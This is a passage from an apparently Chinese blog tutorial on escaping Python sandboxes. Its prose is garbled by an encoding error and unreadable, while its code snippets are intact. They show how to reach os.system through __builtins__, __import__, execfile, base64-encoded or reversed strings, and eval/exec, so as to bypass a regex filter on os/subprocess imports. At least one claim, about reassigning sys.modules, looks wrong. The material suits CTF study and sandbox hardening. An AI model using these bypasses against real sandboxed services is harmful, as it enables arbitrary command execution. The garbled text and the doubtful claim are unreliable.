&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__.__globals__</span><br><span class="line">&#123;&#x27;func&#x27;: &lt;function func at 0x7fba95db5d70&gt;, &#x27;__builtins__&#x27;: &lt;module &#x27;__builtin__&#x27; (built-in)&gt;, &#x27;__package__&#x27;: None, &#x27;stu&#x27;: &lt;__main__.Student instance at 0x7fba95e03cb0&gt;, &#x27;Student&#x27;: &lt;class __main__.Student at 0x7fba95da29a8&gt;, &#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__</span><br><span class="line">&lt;unbound method Student.__init__&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢çš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>__base__</code>è·å–åˆ°æ‰€æœ‰ç±»çš„çˆ¶ç±»Objectç±»ï¼Œç„¶åå†ç”¨<code>__subclasses__()</code>è·å–æ‰€æœ‰ç»§æ‰¿æ­¤ç±»çš„å­ç±»ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½æˆåŠŸçš„åˆ©ç”¨è¿™äº›ç±»äº†</p><p>å¦‚æœè¯¥å…³é”®å­—è¢«è¿‡æ»¤äº†æˆ‘ä»¬å¯ä»¥ï¼Œä»¥ä¸‹ä¸¤è€…ç­‰æ•ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">__init__.__getattribute__(<span class="string">&#x27;__global&#x27;</span>+<span class="string">&#x27;s__&#x27;</span>)[<span class="string">&#x27;sys&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="builtinsã€builtinä¸builtins"><a href="#builtinsã€builtinä¸builtins" class="headerlink" title="builtinsã€builtinä¸builtins"></a>builtinsã€<strong>builtin</strong>ä¸<strong>builtins</strong></h2><p>å…ˆè¯´ä¸€ä¸‹ï¼Œ<code>builtin</code>ã€<code>builtins</code>ï¼Œ<code>__builtin__</code>ä¸<code>__builtins__</code>çš„åŒºåˆ«ï¼šé¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚<code>chr</code>ã€<code>open</code>ã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«<code>å†…å»ºæ¨¡å—</code>ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ï¼Œä¸Šé¢è¯´è¿‡ã€‚å¦å¤–ï¼ŒPython å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ <code>LEGB</code> è§„åˆ™æ¥æ‰¾çš„ï¼Œå…¶ä¸­ B å³ä»£è¡¨å†…å»ºæ¨¡å—ã€‚</p><p>åœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º <code>__builtin__</code>ï¼Œåˆ°äº† 3.x å°±æˆäº† <code>builtins</code>ã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹ï¼š</p><p>2.xï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>3.xï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>è€Œ<code>__builtins__</code> ä¸¤è€…éƒ½æœ‰ï¼Œå®é™…ä¸Šæ˜¯<code>__builtin__</code>å’Œ<code>builtins</code> çš„å¼•ç”¨ã€‚å®ƒä¸éœ€è¦å¯¼å…¥ï¼Œä¼°è®¡æ˜¯ä¸ºäº†ç»Ÿä¸€ 2.x å’Œ 3.xã€‚ä¸è¿‡<code>__builtins__</code>ä¸<code>__builtin__</code>å’Œ<code>builtins</code>æ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«çš„ï¼Œ<code>__builtins__</code> ç›¸å¯¹å®ç”¨ä¸€ç‚¹ï¼Œå¹¶ä¸”åœ¨ <code>__builtins__</code>é‡Œæœ‰å¾ˆå¤šå¥½ä¸œè¥¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ—¢ç„¶<code>__builtins__</code>æœ‰è¿™ä¹ˆå¤šå±é™©çš„å‡½æ•°ï¼Œä¸å¦‚å°†é‡Œé¢çš„å±é™©å‡½æ•°ç ´åäº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥åˆ äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> __builtins__.__dict__[<span class="string">&#x27;eval&#x27;</span>]</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ <code>reload(__builtins__)</code> æ¥æ¢å¤ <code>__builtins__</code>ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ <code>reload</code> çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜<code>reload</code>ä¹Ÿåœ¨ <code>__builtins__</code>é‡Œï¼Œé‚£å¦‚æœè¿<code>reload</code>éƒ½ä»<code>__builtins__</code>ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤<code>__builtins__</code>äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚</p><p>è¿™é‡Œæ³¨æ„ï¼Œ2.x çš„ <code>reload</code> æ˜¯å†…å»ºçš„ï¼Œ3.x éœ€è¦ <code>import imp</code>ï¼Œç„¶åå† <code>imp.reload</code>ã€‚åŒæ ·ä¹Ÿå¯ä»¥reloadå…¶ä»–æ¨¡å—ã€‚</p><h2 id="èŠ±å¼import"><a href="#èŠ±å¼import" class="headerlink" title="èŠ±å¼import"></a>èŠ±å¼import</h2><p>å¯¹äºé˜²å¾¡è€…æ¥è¯´,æœ€åŸºç¡€çš„æ€è·¯,å°±æ˜¯å¯¹ä»£ç çš„å†…å®¹è¿›è¡Œæ£€æŸ¥<br><strong>æœ€å¸¸è§çš„æ–¹æ³•å‘¢,å°±æ˜¯ç¦æ­¢å¼•å…¥æ•æ„Ÿçš„åŒ…</strong>ï¼Œä¸¾ä¸ªä¾‹å­ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">&#x27;code.py&#x27;</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">&#x27;import\s+(os|commands|subprocess|sys)&#x27;</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;forbidden module import detected&quot;</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure><p>ç”¨ä»¥ä¸Šçš„å‡ è¡Œä»£ç ,å°±å¯ä»¥ç®€å•çš„å®Œæˆå¯¹äºæ•æ„Ÿçš„åŒ…çš„æ£€æµ‹</p><p>æˆ‘ä»¬çŸ¥é“,è¦æ‰§è¡Œshellå‘½ä»¤,å¿…é¡»å¼•å…¥<code>os/commands/subprocess</code>è¿™å‡ ä¸ªåŒ…,<br>å¯¹äºæ”»å‡»è€…æ¥è¯´,æ”¹å¦‚ä½•ç»•è¿‡å‘¢,å¿…é¡»ä½¿ç”¨å…¶ä»–çš„å¼•å…¥æ–¹å¼</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>importå¯ä»¥ç”¨æ¥å¯¼å…¥ä¸€ä¸ªåŒ…ï¼Œåœ¨æ¨¡å—å¯¼å…¥çš„æ—¶å€™ï¼Œé»˜è®¤åœ¨å½“å‰ç›®å½•ä¸‹æŸ¥æ‰¾ï¼Œç„¶åå†åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾ï¼Œç³»ç»ŸæŸ¥æ‰¾çš„èŒƒå›´æ˜¯<code>sys.path</code>ä¸‹çš„æ‰€æœ‰è·¯å¾„ï¼š</p><img src="/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/TIMæˆªå›¾20200220233605.png" style="zoom:80%;"><p>importçš„æœ¬è´¨æ˜¯ï¼šæœç´¢moduleså¹¶ç»‘å®šåˆ°å±€éƒ¨å˜é‡</p><p><code>import module_name</code>å®è´¨æ˜¯å°†<code>module_name.py</code>ä¸­çš„å…¨éƒ¨ä»£ç åŠ è½½åˆ°å†…å­˜å¹¶èµ‹å€¼ç»™ä¸æ¨¡å—åŒåçš„å˜é‡å†™åœ¨å½“å‰æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªå˜é‡çš„ç±»å‹æ˜¯<code>module</code></p><img src="/2020/02/16/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/TIMæˆªå›¾20200220234413.png" style="zoom:80%;"><p>ç°åœ¨è®¾ç½®ä¸€ä¸‹modulesä¸­<code>os</code>çš„å€¼ä¸ºNoneï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="literal">None</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Traceback (most recent call last):</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ImportError: No module named os</span><br></pre></td></tr></table></figure><p>å‘ç°æŠŠosä»<code>modules</code>ä¸­åˆ å»å°±ä¸èƒ½ç›´æ¥å¼•å…¥äº†ï¼›ä½†æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥æ¥ç€è®¾ç½®<code>os</code>çš„æ¨¡å—çš„è·¯å¾„ï¼Œä»è€Œå¼•å…¥è¯¥æ¨¡å—ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½ç”¨ <code>del sys.modules[&#39;os&#39;]</code>ï¼Œå› ä¸ºï¼Œå½“ import ä¸€ä¸ªæ¨¡å—æ—¶ï¼šimport Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ Aã€‚</p><p>æ‰€ä»¥åˆ äº† <code>sys.modules[&#39;os&#39;]</code> åªä¼šè®© Python é‡æ–°åŠ è½½ä¸€æ¬¡ osã€‚</p><p>çœ‹åˆ°è¿™ä½ è‚¯å®šå‘ç°äº†ï¼Œå¯¹äºä¸Šé¢çš„è¿‡æ»¤æ–¹å¼ï¼Œç»•è¿‡çš„æ–¹å¼å¯ä»¥æ˜¯è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>] = <span class="string">&#x27;not allowed&#x27;</span> <span class="comment"># oj ä¸ºä½ åŠ çš„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> sys.modules[<span class="string">&#x27;os&#x27;</span>]</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>å¦‚æœsysæ¨¡å—ä¹Ÿä¸èƒ½ç”¨ï¼Œé‚£ä¹ˆå°±ä¸èƒ½é€šè¿‡è®¾ç½®è·¯å¾„æ¥é‡æ–°å¼•å…¥æ¨¡å—äº†ï¼Œä½†å¯ä»¥ä½¿ç”¨pythonçš„å†…å»ºå‡½æ•°ï¼š</p><ul><li>execfileï¼šexecfile() å‡½æ•°å¯ä»¥ç”¨æ¥æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶(python2)</li><li>execï¼šæ‰§è¡Œå­˜å‚¨åœ¨å­—ç¬¦ä¸²æˆ–æ–‡ä»¶ä¸­çš„pythonè¯­å¥ï¼›python2çš„execæ˜¯ä¸€ä¸ªå†…ç½®è¯­å¥è€Œä¸æ˜¯å‡½æ•°ï¼›python3å°†python2ä¸­çš„execå’Œexecfile()åŠŸèƒ½æ•´åˆåˆ°ä¸€ä¸ªexec()å‡½æ•°ä¸­äº†</li></ul><p>ä¾‹å¦‚(python2)ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; execfile(&#39;&#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;os.py&#39;)</span><br><span class="line">&gt;&gt;&gt; system(&#39;ls &#x2F;&#39;)</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">exec</span> open(<span class="string">&#x27;/usr/lib/python2.7/os.py&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">&#x27;lsã€€/&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="import-1"><a href="#import-1" class="headerlink" title="__import__()"></a><code>__import__()</code></h3><p><code>__import__</code>ä½œä¸ºä¸€ä¸ªå‡½æ•°ï¼Œåªèƒ½æ¥å—å­—ç¬¦ä¸²å‚æ•°ï¼Œè¿”å›å€¼å¯ä»¥ç›´æ¥ç”¨æ¥æ“ä½œï¼›é€šå¸¸åœ¨åŠ¨æ€åŠ è½½çš„æ—¶å€™ç”¨åˆ°è¿™ä¸ªå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__import__(<span class="string">&#x27;re&#x27;</span>).findall(<span class="string">&#x27;(hi)&#x27;</span>, <span class="string">&#x27;hilinghi&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;hi&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br></pre></td></tr></table></figure><h3 id="importlib"><a href="#importlib" class="headerlink" title="importlib"></a>importlib</h3><p><code>importlib</code>æ¨¡å—æ˜¯å¯¹<code>import</code>å’Œ<code>__import__()</code>çš„è¡¥å……ï¼›å®ƒä¹Ÿå¯ä»¥é€šè¿‡ä¼ å…¥å­—ç¬¦ä¸²æ¥å¼•å…¥ä¸€ä¸ªæ¨¡å—</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = importlib.import_module(<span class="string">&#x27;os&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.chdir(<span class="string">&#x27;../&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="dir-ä¸-dict"><a href="#dir-ä¸-dict" class="headerlink" title="dir ä¸ __dict__"></a>dir ä¸ <code>__dict__</code></h3><p>è¿™ä¸¤ç§æ–¹æ³•éƒ½æ˜¯ä¸€ä¸ªç›®çš„,é‚£å°±æ˜¯åˆ—å‡ºä¸€ä¸ªæ¨¡ç»„/ç±»/å¯¹è±¡ ä¸‹é¢ æ‰€æœ‰çš„å±æ€§å’Œå‡½æ•°<br>è¿™åœ¨æ²™ç›’é€ƒé€¸ä¸­æ˜¯å¾ˆæœ‰ç”¨çš„,å¯ä»¥æ‰¾åˆ°éšè—åœ¨å…¶ä¸­çš„ä¸€äº›ä¸œè¥¿</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>A.__dict__</span><br><span class="line">mappingproxy(&#123;<span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;asdas&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>: &lt;attribute <span class="string">&#x27;__dict__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;a&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>, <span class="string">&#x27;__weakref__&#x27;</span>: &lt;attribute <span class="string">&#x27;__weakref__&#x27;</span> of <span class="string">&#x27;A&#x27;</span> objects&gt;, <span class="string">&#x27;c&#x27;</span>: &lt;function A.c at <span class="number">0x7f18ea25e510</span>&gt;, <span class="string">&#x27;__module__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>&#125;)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(A)</span><br><span class="line">[<span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>, <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>, <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>, <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__weakref__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br></pre></td></tr></table></figure><h2 id="å¸¸ç”¨çš„æ¨¡å—å’Œæ–¹æ³•"><a href="#å¸¸ç”¨çš„æ¨¡å—å’Œæ–¹æ³•" class="headerlink" title="å¸¸ç”¨çš„æ¨¡å—å’Œæ–¹æ³•"></a>å¸¸ç”¨çš„æ¨¡å—å’Œæ–¹æ³•</h2><h3 id="æ‰§è¡Œå‘½ä»¤å’Œä»£ç "><a href="#æ‰§è¡Œå‘½ä»¤å’Œä»£ç " class="headerlink" title="æ‰§è¡Œå‘½ä»¤å’Œä»£ç "></a>æ‰§è¡Œå‘½ä»¤å’Œä»£ç </h3><h4 id="osæ¨¡å—"><a href="#osæ¨¡å—" class="headerlink" title="osæ¨¡å—"></a>osæ¨¡å—</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">__import__(<span class="string">&quot;os&quot;</span>).popen(<span class="string">&quot;ls&quot;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="platformæ¨¡å—"><a href="#platformæ¨¡å—" class="headerlink" title="platformæ¨¡å—"></a>platformæ¨¡å—</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.popen(<span class="string">&#x27;dir&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="subprocessæ¨¡å—"><a href="#subprocessæ¨¡å—" class="headerlink" title="subprocessæ¨¡å—"></a>subprocessæ¨¡å—</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.call(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"><span class="comment"># stdin, stdout, stderrï¼š åˆ†åˆ«è¡¨ç¤ºç¨‹åºæ ‡å‡†è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯å¥æŸ„ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><strong>å¦‚æœshell=Trueçš„è¯ï¼Œcurlå‘½ä»¤æ˜¯è¢«Bash(Sh)å¯åŠ¨ï¼Œæ‰€ä»¥æ”¯æŒshellè¯­æ³•ã€‚ å¦‚æœshell=Falseçš„è¯ï¼Œå¯åŠ¨çš„æ˜¯å¯æ‰§è¡Œç¨‹åºæœ¬èº«ï¼Œåé¢çš„å‚æ•°ä¸å†æ”¯æŒshellè¯­æ³•ã€‚</strong></p><h3 id="æ–‡ä»¶"><a href="#æ–‡ä»¶" class="headerlink" title="æ–‡ä»¶"></a>æ–‡ä»¶</h3><h4 id="file-å‡½æ•°"><a href="#file-å‡½æ•°" class="headerlink" title="file()å‡½æ•°"></a>file()å‡½æ•°</h4><p>è¯¥å‡½æ•°åªå­˜åœ¨äºPython2ï¼ŒPython3ä¸å­˜åœ¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(<span class="string">&#x27;test.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h4 id="open-å‡½æ•°"><a href="#open-å‡½æ•°" class="headerlink" title="open()å‡½æ•°"></a>open()å‡½æ•°</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&#x27;text.txt&#x27;</span>).read()</span><br></pre></td></tr></table></figure><h2 id="bypassçš„ä¸€äº›å¥—è·¯"><a href="#bypassçš„ä¸€äº›å¥—è·¯" class="headerlink" title="bypassçš„ä¸€äº›å¥—è·¯"></a>bypassçš„ä¸€äº›å¥—è·¯</h2><h3 id="å­—ç¬¦ä¸²è¿‡æ»¤"><a href="#å­—ç¬¦ä¸²è¿‡æ»¤" class="headerlink" title="å­—ç¬¦ä¸²è¿‡æ»¤"></a>å­—ç¬¦ä¸²è¿‡æ»¤</h3><p>å¦‚æœæ²™ç®±å¯¹å¯¼å…¥çš„åŒ…åç§°åšäº†é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¯¼å…¥æ¨¡å—å‰å…ˆå¯¹æ¨¡å—åç§°åšå¤„ç†ï¼Œå¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;os&#x27;</span>.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;b3M=\n&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = __import__(<span class="string">&#x27;b3M=\n&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.chdir(<span class="string">&#x27;../&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.getcwd()</span><br><span class="line"><span class="string">&#x27;/home&#x27;</span></span><br></pre></td></tr></table></figure><p>ä»£ç ä¸­è¦æ˜¯å‡ºç° <code>os</code>ï¼Œç›´æ¥ä¸è®©è¿è¡Œã€‚é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å­—ç¬¦ä¸²çš„å„ç§å˜åŒ–æ¥å¼•å…¥ osï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__import__(<span class="string">&#x27;so&#x27;</span>[::<span class="number">-1</span>]).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">b = <span class="string">&#x27;o&#x27;</span></span><br><span class="line">a = <span class="string">&#x27;s&#x27;</span></span><br><span class="line">__import__(a+b).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥åˆ©ç”¨ <code>eval</code> æˆ–è€… <code>exec</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>eval(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#x27;</span>[::<span class="number">-1</span>])</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>exec(<span class="string">&#x27;)&quot;imaohw&quot;(metsys.so ;so tropmi&#x27;</span>[::<span class="number">-1</span>])</span><br><span class="line">macr0phag3</span><br></pre></td></tr></table></figure><p>evalã€exec 